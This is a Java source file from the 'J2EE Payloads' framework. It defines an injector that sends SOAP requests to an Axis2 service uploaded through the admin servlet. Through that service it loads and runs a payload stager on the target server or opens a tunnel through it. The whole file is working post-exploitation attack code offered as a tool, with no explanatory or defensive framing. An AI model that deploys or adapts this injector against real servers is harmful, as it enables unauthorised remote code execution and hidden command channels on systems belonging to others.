/*
 * J2EE Payloads.
 * 
 * Copyright (c) 2012 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
package j2eepayload.builder;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

import javapayload.Parameter;
import javapayload.builder.Injector;
import javapayload.handler.stager.AxisTunnel;
import javapayload.handler.stager.StagerHandler.Loader;
import javapayload.stage.StreamForwarder;

public class AxisInjector extends Injector {

	protected AxisInjector() {
		super("Inject a payload to an Axis2 AAR uploaded via the admin servlet",
				"This injector is used after uploading an AAR to an Axis2 admin servlet,\r\n" +
				"to load a stager and stage there. If you want to tunnel your traffic\r\n" +
				"through the Axis2 sevice, use the AxisTunnel stager handler.");
	}

	public Parameter[] getParameters() {
		return new Parameter[] {
				new Parameter("URL", false, Parameter.TYPE_URL, "URL to the deployed SOAP endpoint")
		};
	}

	public void inject(String[] parameters, Loader loader, String[] stagerArgs) throws Exception {
		loader.handleBefore(loader.stageHandler.consoleErr, null); // may modify stagerArgs
		String url = parameters[0];
		StringBuffer args = new StringBuffer();
		for (int i = 0; i < stagerArgs.length; i++) {
			if (i != 0)	args.append(" ");
			args.append(stagerArgs[i]);
		}
		boolean isAxisTunnelStager = loader.canHandleExtraArg(AxisTunnel.Connection.class);
		if (isAxisTunnelStager) {
			int result = Integer.parseInt(performAxisCall(url, "create", args.toString()));
			loader.handleAfter(loader.stageHandler.consoleErr, new AxisTunnel.Connection(url, result));
		} else {
			String result = performAxisCall(url, "execute", args.toString());
			if (!result.equals("OK")) {
				throw new IOException("Unexpected response from Axis service: " + result);
			}
			loader.handleAfter(loader.stageHandler.consoleErr, null);
		}	
	}

	public Class[] getSupportedExtraArgClasses() {
		return new Class[] { AxisTunnel.Connection.class, null };
	}

	public static String performAxisCall(String url, String command, String arguments) throws IOException {
		String request = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns=\"http://axis.j2eepayload\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">" +
				"<soapenv:Body><dispatch><command>" + xmlEncode(command) + "</command><arguments>" + xmlEncode(arguments) + "</arguments></dispatch></soapenv:Body></soapenv:Envelope>";
		HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
		conn.setDoOutput(true);
		conn.setRequestMethod("POST");
		conn.setRequestProperty("Content-Type", "text/xml; charset=utf-8");
		conn.setRequestProperty("SOAPAction", "urn:dispatch");
		conn.connect();
		conn.getOutputStream().write(request.getBytes("UTF-8"));
		InputStream in = null;
		if (conn.getResponseCode() == HttpURLConnection.HTTP_INTERNAL_ERROR)
			in = conn.getErrorStream();
		if (in == null)
			in = conn.getInputStream();
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		StreamForwarder.forward(in, baos);
		conn.disconnect();
		String response = new String(baos.toByteArray(), "UTF-8");
		String trimmedResponse = response.replaceAll("[ \t\r\n]+", " ").replaceAll("> <", "><").replace('\'', '"');
		final String RESPONSE_PREFIX = "<?xml version=\"1.0\" encoding=\"utf-8\"?><soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Body><ns:dispatchResponse xmlns:ns=\"http://axis.j2eepayload\"><ns:return>";
		final String RESPONSE_SUFFIX = "</ns:return></ns:dispatchResponse></soapenv:Body></soapenv:Envelope>";
		if (conn.getResponseCode() == HttpURLConnection.HTTP_OK && trimmedResponse.startsWith(RESPONSE_PREFIX) && trimmedResponse.endsWith(RESPONSE_SUFFIX)) {
			return trimmedResponse.substring(RESPONSE_PREFIX.length(), trimmedResponse.length() - RESPONSE_SUFFIX.length());
		} else {
			throw new IOException("Unexpected response: " + conn.getResponseCode() + " " + conn.getResponseMessage() + "\r\n" + response);
		}
	}

	private static String xmlEncode(String text) {
		return text.replaceAll("&", "&amp;").replaceAll("<", "&lt;").replaceAll(">", "&gt;");
	}
}
